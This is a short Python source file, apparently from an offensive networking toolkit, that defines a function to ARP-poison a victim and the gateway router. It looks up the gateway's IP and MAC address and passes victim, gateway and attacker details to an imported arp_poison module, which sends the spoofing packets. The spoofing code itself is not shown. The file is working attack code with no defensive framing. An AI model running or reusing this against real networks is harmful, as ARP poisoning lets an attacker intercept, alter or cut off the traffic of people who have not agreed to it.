from attacks import arp_poison
import get_gateway_ip
import argparse

def poison_gateway_router(victim_ip, victim_mac, attacker_mac, interface):
    """
    Function to poison the gateway router and the victim's ARP tables.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    attacker_mac (str): MAC address of the attacker's machine.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP spoofing packets to the victim and the gateway router.
    - Prints status messages indicating success or failure of the ARP poison.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        gateway_ip = get_gateway_ip.find_gateway_ip()
        gateway_mac = arp_poison.get_mac_address(gateway_ip)
        args = argparse.Namespace()
        args.victim_ip = victim_ip 
        args.victim_mac = victim_mac
        args.gateway_ip = gateway_ip
        args.gateway_mac = gateway_mac    
        args.attacker_mac = attacker_mac
        args.interface = interface
        arp_poison.run(args)
    except Exception as e:
        print("Failed to poison gateway router: %s" % str(e))
